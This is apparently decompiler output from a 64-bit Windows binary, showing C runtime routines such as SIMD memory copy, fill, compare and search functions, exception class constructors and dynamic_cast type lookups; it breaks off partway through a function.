__int64 sub_13F15E9EC()
{
  __int64 v0; // rcx
  __int64 result; // rax

  v0 = sub_13F15FCE8();
  result = 0i64;
  if ( v0 )
    return *(unsigned int *)(v0 + 48);
  return result;
}
// 13F15E9EC: using guessed type __int64 __fastcall sub_13F15E9EC();

//----- (000000013F15EAE0) ----------------------------------------------------
__int64 __fastcall sub_13F15EAE0(void *a1, __int64 a2, unsigned __int64 a3)
{
  const void *v3; // r10
  __int64 v4; // r11
  __int64 result; // rax

  result = v4;
  qmemcpy(a1, v3, a3);
  return result;
}
// 13F15EAE2: variable 'v4' is possibly undefined
// 13F15EAEE: variable 'v3' is possibly undefined

//----- (000000013F15EB00) ----------------------------------------------------
__m128i *__fastcall sub_13F15EB00(__m128i *a1, const __m128i *a2, unsigned __int64 a3)
{
  bool v5; // cf
  __int64 v6; // rdx
  __m128i *result; // rax
  __m128i v8; // xmm1
  __int8 v9; // r8
  __int16 v10; // cx
  __int8 v11; // r9
  __int8 v12; // r8
  __int16 v13; // r8
  __int16 v14; // r8
  __int8 v15; // r9
  __int32 v16; // ecx
  __int8 v17; // r9
  __int8 v18; // cl
  __int16 v19; // cx
  __int32 v20; // ecx
  __int32 v21; // ecx
  __int16 v22; // r9
  __int32 v23; // ecx
  __int16 v24; // r9
  __int8 v25; // r10
  __m128i v26; // xmm0
  __int8 *v27; // r8
  __m128i *v28; // rcx
  __m128i v29; // xmm1
  unsigned __int64 v30; // rcx
  unsigned __int64 v31; // r8
  unsigned __int64 v32; // r9
  __m128i v33; // xmm0
  __m128i v34; // xmm1
  __m128i v35; // xmm1
  __m128i v36; // xmm1
  __m128i v37; // xmm0
  __m128i v38; // xmm1
  unsigned __int64 j; // r9
  unsigned __int64 v40; // r8
  __int8 *v41; // rcx
  __int128 v42; // xmm0
  unsigned __int64 v43; // rcx
  unsigned __int64 v44; // r8
  _OWORD *v45; // rax
  __int128 v46; // xmm1
  unsigned __int64 v47; // r9
  __int128 v48; // xmm0
  __int128 v49; // xmm1
  __int128 v50; // xmm1
  __int128 v51; // xmm1
  __int128 v52; // xmm0
  __int128 v53; // xmm1
  unsigned __int64 i; // r9

  result = a1;
  switch ( a3 )
  {
    case 0ui64:
      return result;
    case 1ui64:
      a1->m128i_i8[0] = a2->m128i_i8[0];
      return result;
    case 2ui64:
      a1->m128i_i16[0] = a2->m128i_i16[0];
      return result;
    case 3ui64:
      v9 = a2->m128i_i8[2];
      a1->m128i_i16[0] = a2->m128i_i16[0];
      a1->m128i_i8[2] = v9;
      return result;
    case 4ui64:
      a1->m128i_i32[0] = a2->m128i_i32[0];
      return result;
    case 5ui64:
      v12 = a2->m128i_i8[4];
      a1->m128i_i32[0] = a2->m128i_i32[0];
      a1->m128i_i8[4] = v12;
      return result;
    case 6ui64:
      v13 = a2->m128i_i16[2];
      a1->m128i_i32[0] = a2->m128i_i32[0];
      a1->m128i_i16[2] = v13;
      return result;
    case 7ui64:
      v14 = a2->m128i_i16[2];
      v15 = a2->m128i_i8[6];
      a1->m128i_i32[0] = a2->m128i_i32[0];
      a1->m128i_i16[2] = v14;
      a1->m128i_i8[6] = v15;
      return result;
    case 8ui64:
      a1->m128i_i64[0] = a2->m128i_i64[0];
      return result;
    case 9ui64:
      v18 = a2->m128i_i8[8];
      result->m128i_i64[0] = a2->m128i_i64[0];
      result->m128i_i8[8] = v18;
      return result;
    case 0xAui64:
      v19 = a2->m128i_i16[4];
      result->m128i_i64[0] = a2->m128i_i64[0];
      result->m128i_i16[4] = v19;
      return result;
    case 0xBui64:
      v10 = a2->m128i_i16[4];
      v11 = a2->m128i_i8[10];
      result->m128i_i64[0] = a2->m128i_i64[0];
      result->m128i_i16[4] = v10;
      result->m128i_i8[10] = v11;
      return result;
    case 0xCui64:
      v20 = a2->m128i_i32[2];
      result->m128i_i64[0] = a2->m128i_i64[0];
      result->m128i_i32[2] = v20;
      return result;
    case 0xDui64:
      v16 = a2->m128i_i32[2];
      v17 = a2->m128i_i8[12];
      result->m128i_i64[0] = a2->m128i_i64[0];
      result->m128i_i32[2] = v16;
      result->m128i_i8[12] = v17;
      return result;
    case 0xEui64:
      v21 = a2->m128i_i32[2];
      v22 = a2->m128i_i16[6];
      result->m128i_i64[0] = a2->m128i_i64[0];
      result->m128i_i32[2] = v21;
      result->m128i_i16[6] = v22;
      return result;
    case 0xFui64:
      v23 = a2->m128i_i32[2];
      v24 = a2->m128i_i16[6];
      v25 = a2->m128i_i8[14];
      result->m128i_i64[0] = a2->m128i_i64[0];
      result->m128i_i32[2] = v23;
      result->m128i_i16[6] = v24;
      result->m128i_i8[14] = v25;
      return result;
    case 0x10ui64:
      *a1 = _mm_loadu_si128(a2);
      return result;
    default:
      if ( a3 <= 0x20 )
      {
        v8 = *(const __m128i *)((char *)&a2[-1] + a3);
        *a1 = *a2;
        *(__m128i *)((char *)&a1[-1] + a3) = v8;
        return a1;
      }
      else
      {
        v5 = a2 < a1;
        v6 = (char *)a2 - (char *)a1;
        if ( v5 && a1 < (__m128i *)&a2->m128i_i8[a3] )
        {
          v41 = &a1->m128i_i8[a3];
          v42 = *(_OWORD *)&v41[v6 - 16];
          v43 = (unsigned __int64)(v41 - 16);
          v44 = a3 - 16;
          if ( (v43 & 0xF) != 0 )
          {
            v45 = (_OWORD *)v43;
            v43 &= 0xFFFFFFFFFFFFFFF0ui64;
            v46 = v42;
            v42 = *(_OWORD *)(v43 + v6);
            *v45 = v46;
            v44 = v43 - (_QWORD)a1;
          }
          v47 = v44 >> 7;
          if ( v44 >> 7 )
          {
            for ( *(_OWORD *)v43 = v42; ; *(_OWORD *)v43 = v53 )
            {
              v48 = *(_OWORD *)(v43 + v6 - 16);
              v49 = *(_OWORD *)(v43 + v6 - 32);
              v43 -= 128i64;
              *(_OWORD *)(v43 + 112) = v48;
              *(_OWORD *)(v43 + 96) = v49;
              v50 = *(_OWORD *)(v43 + v6 + 64);
              --v47;
              *(_OWORD *)(v43 + 80) = *(_OWORD *)(v43 + v6 + 80);
              *(_OWORD *)(v43 + 64) = v50;
              v51 = *(_OWORD *)(v43 + v6 + 32);
              *(_OWORD *)(v43 + 48) = *(_OWORD *)(v43 + v6 + 48);
              *(_OWORD *)(v43 + 32) = v51;
              v52 = *(_OWORD *)(v43 + v6 + 16);
              v53 = *(_OWORD *)(v43 + v6);
              if ( !v47 )
                break;
              *(_OWORD *)(v43 + 16) = v52;
            }
            *(_OWORD *)(v43 + 16) = v52;
            v44 &= 0x7Fu;
            v42 = v53;
          }
          for ( i = v44 >> 4; i; --i )
          {
            *(_OWORD *)v43 = v42;
            v43 -= 16i64;
            v42 = *(_OWORD *)(v43 + v6);
          }
          if ( (v44 & 0xF) != 0 )
            *a1 = *a2;
          *(_OWORD *)v43 = v42;
          return a1;
        }
        else
        {
          if ( a3 <= 0x80 )
          {
            if ( _bittest(&dword_13F1C5CF4, 2u) )
              return (__m128i *)sub_13F15EAE0(a1, v6, a3);
            v26 = *(__m128i *)((char *)a1 + v6);
            v28 = a1 + 1;
            v31 = a3 - 16;
          }
          else
          {
            if ( _bittest(&dword_13F1C5CF4, 1u) )
              return (__m128i *)sub_13F15EAE0(a1, v6, a3);
            v26 = *(__m128i *)((char *)a1 + v6);
            v27 = &a1->m128i_i8[a3];
            v28 = a1 + 1;
            if ( ((unsigned __int8)a1 & 0xF) != 0 )
            {
              v29 = v26;
              v30 = (unsigned __int64)v28 & 0xFFFFFFFFFFFFFFF0ui64;
              v26 = *(__m128i *)(v30 + v6);
              v28 = (__m128i *)(v30 + 16);
              *a1 = v29;
            }
            v31 = v27 - (__int8 *)v28;
            v32 = v31 >> 7;
            if ( v31 >> 7 )
            {
              for ( v28[-1] = v26; ; v28[-1] = v38 )
              {
                v33 = *(__m128i *)((char *)v28 + v6);
                v34 = *(__m128i *)((char *)&v28[1] + v6);
                v28 += 8;
                v28[-8] = v33;
                v28[-7] = v34;
                v35 = *(__m128i *)((char *)&v28[-5] + v6);
                --v32;
                v28[-6] = *(__m128i *)((char *)&v28[-6] + v6);
                v28[-5] = v35;
                v36 = *(__m128i *)((char *)&v28[-3] + v6);
                v28[-4] = *(__m128i *)((char *)&v28[-4] + v6);
                v28[-3] = v36;
                v37 = *(__m128i *)((char *)&v28[-2] + v6);
                v38 = *(__m128i *)((char *)&v28[-1] + v6);
                if ( !v32 )
                  break;
                v28[-2] = v37;
              }
              v28[-2] = v37;
              v31 &= 0x7Fu;
              v26 = v38;
            }
          }
          for ( j = v31 >> 4; j; --j )
          {
            v28[-1] = v26;
            v26 = *(__m128i *)((char *)v28++ + v6);
          }
          v40 = v31 & 0xF;
          if ( v40 )
            *(__m128i *)((char *)&v28[-1] + v40) = *(__m128i *)((char *)&v28[-1] + v40 + v6);
          v28[-1] = v26;
          return a1;
        }
      }
  }
}
// 13F1B71A8: using guessed type __int64 qword_13F1B71A8;
// 13F1C5CF4: using guessed type int dword_13F1C5CF4;

//----- (000000013F15EF50) ----------------------------------------------------
__int64 __fastcall sub_13F15EF50(void *a1, char a2, unsigned __int64 a3)
{
  __int64 v3; // r11

  memset(a1, a2, a3);
  return v3;
}
// 13F15EF5B: variable 'v3' is possibly undefined

//----- (000000013F15EF70) ----------------------------------------------------
__int64 __fastcall sub_13F15EF70(__int64 a1, unsigned __int8 a2, unsigned __int64 a3)
{
  __m128i v4; // xmm0
  __int64 result; // rax
  __int8 *v6; // r8
  __m128i *v7; // rcx
  unsigned __int64 v8; // r9
  unsigned __int64 i; // r9
  unsigned __int64 v10; // r8
  __int64 v11; // rdx

  v11 = 0x101010101010101i64 * a2;
  v7 = (__m128i *)(a3 + a1);
  result = a1;
  switch ( a3 )
  {
    case 0ui64:
      return result;
    case 1ui64:
      goto LABEL_18;
    case 2ui64:
      goto LABEL_26;
    case 3ui64:
      goto LABEL_17;
    case 4ui64:
      goto LABEL_20;
    case 5ui64:
      goto LABEL_23;
    case 6ui64:
      goto LABEL_25;
    case 7ui64:
      goto LABEL_16;
    case 8ui64:
      *(_QWORD *)a1 = v11;
      return result;
    case 9ui64:
      *(__int64 *)((char *)v7[-1].m128i_i64 + 7) = v11;
      v7[-1].m128i_i8[15] = v11;
      return result;
    case 0xAui64:
      *(_QWORD *)a1 = v11;
      *(_WORD *)(a1 + 8) = v11;
      return result;
    case 0xBui64:
      *(_QWORD *)a1 = v11;
      *(_WORD *)(a1 + 8) = v11;
      *(_BYTE *)(a1 + 10) = v11;
      return result;
    case 0xCui64:
      *(__int64 *)((char *)v7[-1].m128i_i64 + 4) = v11;
LABEL_20:
      v7[-1].m128i_i32[3] = v11;
      return result;
    case 0xDui64:
      *(__int64 *)((char *)v7[-1].m128i_i64 + 3) = v11;
LABEL_23:
      *(__int32 *)((char *)&v7[-1].m128i_i32[2] + 3) = v11;
      v7[-1].m128i_i8[15] = v11;
      return result;
    case 0xEui64:
      *(__int64 *)((char *)v7[-1].m128i_i64 + 2) = v11;
LABEL_25:
      *(__int32 *)((char *)&v7[-1].m128i_i32[2] + 2) = v11;
LABEL_26:
      v7[-1].m128i_i16[7] = v11;
      return result;
    case 0xFui64:
      *(__int64 *)((char *)v7[-1].m128i_i64 + 1) = v11;
LABEL_16:
      *(__int32 *)((char *)&v7[-1].m128i_i32[2] + 1) = v11;
LABEL_17:
      *(__int16 *)((char *)&v7[-1].m128i_i16[6] + 1) = v11;
LABEL_18:
      v7[-1].m128i_i8[15] = v11;
      return result;
    case 0x10ui64:
      *(_QWORD *)a1 = v11;
      *(_QWORD *)(a1 + 8) = v11;
      return result;
    default:
      v4 = _mm_unpacklo_epi8((__m128i)0x13F100000ui64, (__m128i)0x13F100000ui64);
      if ( a3 > 0x80 )
      {
        if ( _bittest(&dword_13F1C5CF4, 1u) )
          return sub_13F15EF50(v7, v11, a3);
        *v7 = v4;
        v6 = &v7->m128i_i8[a3];
        v7 = (__m128i *)((unsigned __int64)&v7[1] & 0xFFFFFFFFFFFFFFF0ui64);
        a3 = v6 - (__int8 *)v7;
        v8 = a3 >> 7;
        if ( a3 >> 7 )
        {
          do
          {
            *v7 = v4;
            v7[1] = v4;
            v7 += 8;
            v7[-6] = v4;
            v7[-5] = v4;
            --v8;
            v7[-4] = v4;
            v7[-3] = v4;
            v7[-2] = v4;
            v7[-1] = v4;
          }
          while ( v8 );
          a3 &= 0x7Fu;
        }
      }
      else if ( _bittest(&dword_13F1C5CF4, 2u) )
      {
        return sub_13F15EF50(v7, v11, a3);
      }
      for ( i = a3 >> 4; i; --i )
        *v7++ = v4;
      v10 = a3 & 0xF;
      if ( v10 )
        *(__m128i *)((char *)&v7[-1] + v10) = v4;
      return a1;
  }
}
// 13F1C5CF4: using guessed type int dword_13F1C5CF4;

//----- (000000013F15F110) ----------------------------------------------------
__int64 __fastcall sub_13F15F110(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rdx
  bool v4; // cf
  unsigned __int64 v6; // r9
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // r9

  v3 = a2 - (_QWORD)a1;
  if ( a3 < 8 )
    goto LABEL_6;
  for ( ; ((unsigned __int8)a1 & 7) != 0; --a3 )
  {
    v4 = *(_BYTE *)a1 < *((_BYTE *)a1 + v3);
    if ( *(_BYTE *)a1 != *((_BYTE *)a1 + v3) )
      return -v4 - ((unsigned int)v4 - 1);
    a1 = (unsigned __int64 *)((char *)a1 + 1);
  }
  if ( !(a3 >> 3) )
  {
LABEL_6:
    if ( !a3 )
      return 0i64;
    while ( 1 )
    {
      v4 = *(_BYTE *)a1 < *((_BYTE *)a1 + v3);
      if ( *(_BYTE *)a1 != *((_BYTE *)a1 + v3) )
        break;
      a1 = (unsigned __int64 *)((char *)a1 + 1);
      if ( !--a3 )
        return 0i64;
    }
    return -v4 - ((unsigned int)v4 - 1);
  }
  v6 = a3 >> 5;
  if ( a3 >> 5 )
  {
    while ( 1 )
    {
      v7 = *a1;
      if ( *a1 != *(unsigned __int64 *)((char *)a1 + v3) )
        break;
      v7 = a1[1];
      if ( v7 != *(unsigned __int64 *)((char *)a1 + v3 + 8) )
        goto LABEL_24;
      v7 = a1[2];
      if ( v7 != *(unsigned __int64 *)((char *)a1 + v3 + 16) )
        goto LABEL_23;
      v7 = a1[3];
      if ( v7 != *(unsigned __int64 *)((char *)a1 + v3 + 24) )
      {
        ++a1;
LABEL_23:
        ++a1;
LABEL_24:
        ++a1;
        break;
      }
      a1 += 4;
      if ( !--v6 )
      {
        a3 &= 0x1Fu;
        goto LABEL_18;
      }
    }
  }
  else
  {
LABEL_18:
    v8 = a3 >> 3;
    if ( !(a3 >> 3) )
      goto LABEL_6;
    while ( 1 )
    {
      v7 = *a1;
      if ( *a1 != *(unsigned __int64 *)((char *)a1 + v3) )
        break;
      ++a1;
      if ( !--v8 )
      {
        a3 &= 7u;
        goto LABEL_6;
      }
    }
  }
  v4 = _byteswap_uint64(v7) < _byteswap_uint64(*(unsigned __int64 *)((char *)a1 + v3));
  return -v4 - ((unsigned int)v4 - 1);
}

//----- (000000013F15F1D8) ----------------------------------------------------
_QWORD *__fastcall sub_13F15F1D8(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F18C6A0;
  return a1;
}
// 13F18C6A0: using guessed type __int64 (__fastcall *off_13F18C6A0[2])();

//----- (000000013F15F218) ----------------------------------------------------
_QWORD *__fastcall sub_13F15F218(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = &std::bad_typeid::`vftable';
  return a1;
}
// 13F18C688: using guessed type void *std::bad_typeid::`vftable';

//----- (000000013F15F258) ----------------------------------------------------
__int64 __fastcall sub_13F15F258(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v7; // rax
  __int64 v8; // r11
  __int64 v9; // rsi
  unsigned int v10; // er14
  int v11; // edi
  unsigned int v12; // er8
  unsigned int v13; // er12
  int *v14; // rbp
  int *v15; // rdx
  __int64 v16; // rax
  unsigned __int8 *v17; // rax
  __int64 v18; // rbx
  int v19; // er9
  int v20; // ecx
  __int64 v21; // rax
  unsigned __int8 *v22; // rax
  __int64 v23; // rbx
  int v24; // er9
  int v25; // ecx
  __int64 v26; // r9
  __int64 v28; // r8
  bool v29; // zf

  v7 = *(int *)(a2 + 16);
  v8 = 0i64;
  v9 = 0i64;
  v10 = 0;
  v11 = -1;
  v12 = 0;
  v13 = *(_DWORD *)(v7 + a6 + 8);
  v14 = (int *)(a6 + *(int *)(v7 + a6 + 12));
  if ( !v13 )
    return 0i64;
  while ( 1 )
  {
    v15 = (int *)(a6 + *v14);
    if ( v12 - v11 > v10 )
    {
      v16 = a6 + *v15;
      if ( v16 == a5 )
        goto LABEL_8;
      v17 = (unsigned __int8 *)(v16 + 16);
      v18 = a5 + 16 - (_QWORD)v17;
      do
      {
        v19 = v17[v18];
        v20 = *v17 - v19;
        if ( v20 )
          break;
        ++v17;
      }
      while ( v19 );
      if ( !v20 )
      {
LABEL_8:
        if ( v9 )
        {
          if ( (v15[5] & 3) == 0 && (*(_BYTE *)(v9 + 20) & 1) == 0 )
            return a6 + *v14;
          return 0i64;
        }
        v10 = v15[1];
        v8 = a6 + *v14;
        v11 = v12;
      }
    }
    v21 = a6 + *v15;
    if ( v21 == a3 )
      goto LABEL_17;
    v22 = (unsigned __int8 *)(v21 + 16);
    v23 = a3 + 16 - (_QWORD)v22;
    do
    {
      v24 = v22[v23];
      v25 = *v22 - v24;
      if ( v25 )
        break;
      ++v22;
    }
    while ( v24 );
    if ( !v25 )
    {
LABEL_17:
      v26 = 0i64;
      if ( v15[3] >= 0 )
        v26 = *(int *)(*(_QWORD *)(v15[3] + a1) + v15[4]) + (__int64)v15[3];
      if ( v26 + v15[2] == a4 )
        break;
    }
LABEL_20:
    ++v12;
    ++v14;
    if ( v12 >= v13 )
      return 0i64;
  }
  if ( !v8 )
  {
    v9 = a6 + *v14;
    goto LABEL_20;
  }
  v28 = v12 - v11;
  if ( (unsigned int)v28 <= v10 )
  {
    if ( (*(_BYTE *)(v8 + 20) & 0x40) != 0 )
    {
      v29 = (*(_BYTE *)(*(int *)(a6 + *(int *)(*(int *)(v8 + 24) + a6 + 12) + 4 * v28) + a6 + 20) & 1) == 0;
      goto LABEL_30;
    }
    if ( !v11 )
    {
      v29 = (v15[5] & 1) == 0;
LABEL_30:
      if ( !v29 )
        return 0i64;
    }
    return v8;
  }
  if ( (*(_BYTE *)(v8 + 20) & 3) == 0 && (v15[5] & 1) == 0 )
    return v8;
  return 0i64;
}

//----- (000000013F15F3E0) ----------------------------------------------------
int *__fastcall sub_13F15F3E0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rax
  unsigned int v7; // er10
  __int64 v8; // r11
  int *v9; // r8
  int *v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // rbp
  int *i; // r8
  int *v14; // rdi
  unsigned __int8 *v15; // rdx
  __int64 v16; // rsi
  int v17; // ebx
  int v18; // eax
  int *v20; // r8
  __int64 v21; // rax
  int *v22; // r8
  __int64 v23; // rax
  __int64 v24; // rax
  unsigned __int8 *v25; // rdx
  __int64 v26; // rbx
  int v27; // er11
  int v28; // eax

  v4 = *(int *)(a1 + 16);
  LODWORD(a1) = 0;
  v7 = *(_DWORD *)(v4 + a4 + 8);
  v8 = a4 + *(int *)(v4 + a4 + 12);
  if ( v7 )
  {
    v9 = (int *)(a4 + *(int *)(v4 + a4 + 12));
    while ( 1 )
    {
      v10 = (int *)(a4 + *v9);
      a1 = (unsigned int)(a1 + 1);
      if ( a4 + *v10 == a3 )
        break;
      ++v9;
      if ( (unsigned int)a1 >= v7 )
        goto LABEL_5;
    }
    if ( (unsigned int)a1 < v7 )
    {
      v20 = (int *)(v8 + 4 * a1);
      do
      {
        v21 = *v20;
        if ( (*(_BYTE *)(v21 + a4 + 20) & 4) != 0 )
          break;
        if ( a4 + *(int *)(v21 + a4) == a2 )
          return v10;
        LODWORD(a1) = a1 + 1;
        ++v20;
      }
      while ( (unsigned int)a1 < v7 );
    }
  }
  else
  {
LABEL_5:
    LODWORD(v11) = 0;
    if ( v7 )
    {
      v12 = a3 + 16;
      for ( i = (int *)(a4 + *(int *)(v4 + a4 + 12)); ; ++i )
      {
        v14 = (int *)(a4 + *i);
        v11 = (unsigned int)(v11 + 1);
        v15 = (unsigned __int8 *)(*v14 + a4 + 16);
        v16 = v12 - (_QWORD)v15;
        do
        {
          v17 = v15[v16];
          v18 = *v15 - v17;
          if ( v18 )
            break;
          ++v15;
        }
        while ( v17 );
        if ( !v18 )
          break;
        if ( (unsigned int)v11 >= v7 )
          return 0i64;
      }
      if ( (unsigned int)v11 < v7 )
      {
        v22 = (int *)(v8 + 4 * v11);
        do
        {
          v23 = *v22;
          if ( (*(_BYTE *)(v23 + a4 + 20) & 4) != 0 )
            break;
          v24 = *(int *)(v23 + a4);
          v25 = (unsigned __int8 *)(v24 + a4 + 16);
          v26 = a2 - (v24 + a4);
          do
          {
            v27 = v25[v26];
            v28 = *v25 - v27;
            if ( v28 )
              break;
            ++v25;
          }
          while ( v27 );
          if ( !v28 )
            return v14;
          LODWORD(v11) = v11 + 1;
          ++v22;
        }
        while ( (unsigned int)v11 < v7 );
      }
    }
  }
  return 0i64;
}

//----- (000000013F15F51C) ----------------------------------------------------
__int64 __fastcall sub_13F15F51C(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v7; // r8
  __int64 v8; // rax
  int v9; // er12
  __int64 v10; // rdi
  __int64 v11; // r14
  __int64 v12; // rbp
  __int64 v13; // r11
  unsigned int v14; // er13
  char v15; // r9
  int *v16; // r15
  unsigned int v17; // ebx
  int *v18; // rdx
  __int64 v19; // rax
  unsigned __int8 *v20; // rax
  __int64 v21; // r10
  int v22; // er8
  int v23; // ecx
  __int64 v24; // rax
  __int64 v25; // rax
  unsigned __int8 *v26; // rax
  __int64 v27; // r10
  int v28; // er8
  int v29; // ecx
  __int64 v30; // r8
  bool v31; // dl
  __int64 v32; // rcx
  bool v33; // zf
  char v34; // cl
  __int64 v35; // rdx
  __int64 v38; // [rsp+50h] [rbp+10h]
  unsigned int v41; // [rsp+70h] [rbp+30h]

  v7 = 0i64;
  v8 = *(int *)(a2 + 16);
  v9 = -1;
  v38 = -1i64;
  v10 = 0i64;
  v11 = 0i64;
  v12 = 0i64;
  v13 = 0i64;
  v14 = 0;
  v15 = 1;
  v16 = (int *)(a6 + *(int *)(v8 + a6 + 12));
  v41 = *(_DWORD *)(v8 + a6 + 8);
  v17 = 0;
  if ( !v41 )
    return 0i64;
  do
  {
    v18 = (int *)(a6 + *v16);
    if ( v17 - v9 > v14 )
    {
      v19 = a6 + *v18;
      if ( v19 == a5 )
        goto LABEL_8;
      v20 = (unsigned __int8 *)(v19 + 16);
      v21 = a5 + 16 - (_QWORD)v20;
      do
      {
        v22 = v20[v21];
        v23 = *v20 - v22;
        if ( v23 )
          break;
        ++v20;
      }
      while ( v22 );
      v7 = 0i64;
      if ( !v23 )
      {
LABEL_8:
        v24 = a6 + *v16;
        v14 = v18[1];
        v13 = v24;
        if ( (v18[5] & 3) != 0 )
          v24 = v12;
        v9 = v17;
        v12 = v24;
      }
    }
    v25 = a6 + *v18;
    if ( v25 == a3 )
      goto LABEL_16;
    v26 = (unsigned __int8 *)(v25 + 16);
    v27 = a3 + 16 - (_QWORD)v26;
    do
    {
      v28 = v26[v27];
      v29 = *v26 - v28;
      if ( v29 )
        break;
      ++v26;
    }
    while ( v28 );
    v7 = 0i64;
    if ( !v29 )
    {
LABEL_16:
      if ( v18[3] >= 0 )
        v7 = *(int *)(*(_QWORD *)(v18[3] + a1) + v18[4]) + (__int64)v18[3];
      if ( v7 + v18[2] != a4 )
        goto LABEL_38;
      v30 = v17 - v9;
      if ( (unsigned int)v30 > v14 )
      {
        if ( (v18[5] & 5) == 0 )
          v11 = a6 + *v16;
LABEL_38:
        v7 = 0i64;
        goto LABEL_39;
      }
      if ( !v15 )
        goto LABEL_38;
      if ( (*(_BYTE *)(v13 + 20) & 0x40) != 0 )
      {
        v32 = *(int *)(a6 + *(int *)(*(int *)(v13 + 24) + a6 + 12) + 4 * v30);
        v7 = 0i64;
        v31 = (*(_DWORD *)(v32 + a6 + 20) & 4) == 0;
        v33 = (*(_BYTE *)(v32 + a6 + 20) & 1) == 0;
        v34 = 0;
        if ( v33 )
          v34 = v15;
        v15 = v34;
      }
      else
      {
        v7 = 0i64;
        if ( !v9 && (v18[5] & 1) != 0 )
          v15 = 0;
        v31 = 1;
      }
      if ( v15 && v31 )
      {
        v35 = 0i64;
        if ( *(int *)(v13 + 12) >= 0 )
          v35 = *(int *)(*(_QWORD *)(*(int *)(v13 + 12) + a1) + *(int *)(v13 + 16)) + (__int64)*(int *)(v13 + 12);
        if ( v10 && v38 != v35 + *(int *)(v13 + 8) )
          return 0i64;
        v10 = v13;
        v38 = v35 + *(int *)(v13 + 8);
      }
    }
LABEL_39:
    ++v17;
    ++v16;
  }
  while ( v17 < v41 );
  if ( v15 && v10 )
    return v10;
  if ( v11 && v12 )
    return v12;
  return 0i64;
}

//----- (000000013F15F73C) ----------------------------------------------------
_QWORD *__fastcall sub_13F15F73C(_QWORD *a1, __int64 a2)
{
  _QWORD *result; // rax

  a1[2] = 0i64;
  *a1 = off_13F18C6A0;
  result = a1;
  a1[1] = a2;
  return result;
}
// 13F18C6A0: using guessed type __int64 (__fastcall *off_13F18C6A0[2])();

//----- (000000013F15F754) ----------------------------------------------------
_QWORD *__fastcall sub_13F15F754(_QWORD *a1, __int64 a2)
{
  _QWORD *result; // rax

  a1[2] = 0i64;
  *a1 = &std::bad_cast::`vftable';
  result = a1;
  a1[1] = a2;
  return result;
}
// 13F181C90: using guessed type void *std::bad_cast::`vftable';

//----- (000000013F15F76C) ----------------------------------------------------
char *__fastcall sub_13F15F76C(_QWORD *a1, int a2, __int64 a3, __int64 a4, int a5)
{
  __int64 v7; // r13
  __int64 v9; // rbx
  _DWORD *v11; // rsi
  char *v12; // r14
  __int64 v13; // r9
  int v14; // ecx
  int *v15; // rax
  char *v16; // r9
  __int64 v17; // [rsp+28h] [rbp-50h]
  __int64 pExceptionObject[4]; // [rsp+30h] [rbp-48h] BYREF
  __int64 v19; // [rsp+80h] [rbp+8h] BYREF

  v7 = a2;
  v9 = 0i64;
  if ( !a1 )
    return 0i64;
  v11 = *(_DWORD **)(*a1 - 8i64);
  v12 = (char *)a1 - (unsigned int)v11[1] - (v11[2] != 0 ? *(_DWORD *)((char *)a1 - (unsigned int)v11[2]) : 0);
  if ( *v11 )
  {
    v13 = (__int64)v11 - (int)v11[5];
  }
  else
  {
    v13 = MEMORY[0x76FA0500](v11, &v19);
    v19 = v13;
  }
  v14 = *(_DWORD *)((int)v11[4] + v13 + 4);
  if ( (v14 & 1) != 0 )
  {
    v17 = v13;
    v16 = (char *)((char *)a1 - v7 - v12);
    if ( (v14 & 2) != 0 )
      v15 = (int *)sub_13F15F51C((__int64)v12, (__int64)v11, a3, (__int64)v16, a4, v17);
    else
      v15 = (int *)sub_13F15F258((__int64)v12, (__int64)v11, a3, (__int64)v16, a4, v17);
  }
  else
  {
    v15 = sub_13F15F3E0((__int64)v11, a3, a4, v13);
  }
  if ( v15 )
  {
    if ( v15[3] >= 0 )
      v9 = *(int *)(*(_QWORD *)&v12[v15[3]] + v15[4]) + (__int64)v15[3];
    return &v12[v9 + v15[2]];
  }
  else
  {
    if ( a5 )
    {
      sub_13F15F754(pExceptionObject, (__int64)"Bad dynamic_cast!");
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_cast_std__);
    }
    return 0i64;
  }
}
// 13F15F76C: using guessed type _QWORD pExceptionObject[4];

//----- (000000013F15F8F0) ----------------------------------------------------
__int64 __fastcall sub_13F15F8F0(const __m128i *a1, unsigned int a2, unsigned __int64 a3)
{
  __m128i v3; // xmm0
  __m128i v4; // xmm1
  __int64 v6; // rax
  __int8 v7; // al

  if ( a3 < 0x10 )
  {
LABEL_5:
    if ( a3 )
    {
      while ( 1 )
      {
        v7 = a1->m128i_i8[0];
        a1 = (const __m128i *)((char *)a1 + 1);
        if ( (unsigned __int8)a2 == (unsigned __int8)v7 )
          break;
        if ( !--a3 )
          return 0i64;
      }
      return (__int64)&a1[-1].m128i_i64[1] + 7;
    }
    else
    {
      return 0i64;
    }
  }
  else
  {
    a2 = 16843009 * (unsigned __int8)a2;
    v3 = _mm_shuffle_epi32(_mm_cvtsi32_si128(a2), 0);
    while ( 1 )
    {
      v4 = _mm_loadu_si128(a1++);
      a3 -= 16i64;
      if ( _BitScanForward64((unsigned __int64 *)&v6, (unsigned int)_mm_movemask_epi8(_mm_cmpeq_epi8(v4, v3))) )
        return (__int64)&a1[-1] + v6;
      if ( a3 < 0x10 )
        goto LABEL_5;
    }
  }
}

//----- (000000013F15F960) ----------------------------------------------------
char sub_13F15F960()
{
  sub_13F1678D4();
  sub_13F167D04();
  if ( !sub_13F1678E4() )
    return 0;
  if ( !sub_13F15FD38() )
  {
    sub_13F167948();
    return 0;
  }
  return 1;
}

//----- (000000013F15F994) ----------------------------------------------------
char __fastcall sub_13F15F994(char a1)
{
  if ( !a1 )
  {
    sub_13F15FD8C();
    sub_13F167948();
    sub_13F167D34(0);
  }
  return 1;
}

//----- (000000013F15FBC0) ----------------------------------------------------
bool sub_13F15FBC0()
{
  __int64 v0; // rcx
  bool result; // al

  v0 = sub_13F15FCE8();
  result = 0;
